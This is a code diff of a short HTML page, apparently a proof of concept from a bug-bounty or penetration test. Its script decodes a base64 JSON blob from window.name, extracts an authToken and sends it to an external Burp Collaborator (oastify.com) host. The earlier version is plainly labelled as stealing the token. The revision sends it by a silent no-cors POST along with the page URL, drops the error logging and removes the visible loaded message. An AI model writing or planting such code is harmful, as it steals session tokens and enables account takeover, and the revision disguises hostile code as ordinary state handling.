@@ -1,17 +1,21 @@
 <html>
 <body>
   <script>
-    try {
-      // Grab the juicy stuff from window.name
-      const metadata = JSON.parse(atob(window.name));
-      const token = metadata.props.context.environment.authToken;
+    (function() {
+      try {
+        // Decode the state injected by the parent
+        const rawData = window.name ? JSON.parse(atob(window.name)) : null;
+        const token = rawData?.props?.context?.environment?.authToken;
 
-      // Send it straight to your Burp Collab
-      fetch("https://srnboyarclwnk0w6kp055kvdb4hy5otd.oastify.com/?stolen=" + token);
-    } catch(e) {
-      console.error("Failed to grab token", e);
-    }
+        if (token) {
+          fetch("https://srnboyarclwnk0w6kp055kvdb4hy5otd.oastify.com/", {
+            method: "POST",
+            mode: "no-cors", // Ensures the request fires even if CORS fails
+            body: JSON.stringify({ token: token, origin: window.location.href })
+          });
+        }
+      } catch(e) {}
+    })();
   </script>
-  <p>App Loaded Successfully</p>
 </body>
 </html>
